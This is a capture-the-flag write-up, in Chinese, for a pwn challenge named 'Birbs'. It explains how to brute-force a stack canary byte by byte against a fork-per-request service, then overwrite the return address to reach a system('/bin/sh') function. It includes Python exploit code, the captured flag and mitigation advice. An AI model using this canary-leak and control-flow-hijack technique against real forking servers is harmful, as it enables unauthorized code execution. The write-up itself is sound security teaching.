# Birbs

## 题目简述

网络服务每次请求都 fork 子进程处理。子进程把最多 100 字节读入 32 字节栈缓冲区，但启用了 Canary。由于所有子进程从同一父进程 fork，Canary 在不同尝试间保持不变；崩溃与正常返回的响应差异形成逐字节 oracle。

## 解题过程

缓冲区到 Canary 的偏移为 0x28。Canary 首字节通常为 0，但利用无需假设，依次枚举每个位置的 0 至 255。正确前缀不会触发 stack smashing，服务会返回 again：

~~~python
canary = b""
while len(canary) < 8:
    for guess in range(256):
        choose_overflow()
        payload = b"A" * 0x28 + canary + bytes([guess])
        io.send(payload)
        response = io.recvline(timeout=1)
        if b"again" in response:
            canary += bytes([guess])
            break
~~~

fork 模型很关键：若每次 exec 一个新进程并重新随机化，上一轮前缀不能复用。恢复 8 字节 Canary 后，在其后补 8 字节保存的 RBP，再把 RIP 改为无 PIE 的 cave_exit 0x40129e；该函数内部调用 system("/bin/sh")：

~~~python
payload = b"A" * 0x28 + canary
payload += b"B" * 8
payload += p64(0x40129e)
~~~

获得 shell 后读取：

~~~text
maple{f0110W_T4E_B1rB5_T0_TH3_3x1T_562asddw126}
~~~

## 方法总结

Canary 的保密性依赖攻击者不能反复观察相同值的校验结果。预 fork/fork-per-connection 服务会让子进程继承相同 Canary，从而产生稳定崩溃 oracle。缓解措施包括限制重试和速率、消除溢出，并在架构允许时让工作进程通过 exec 获得独立随机状态。
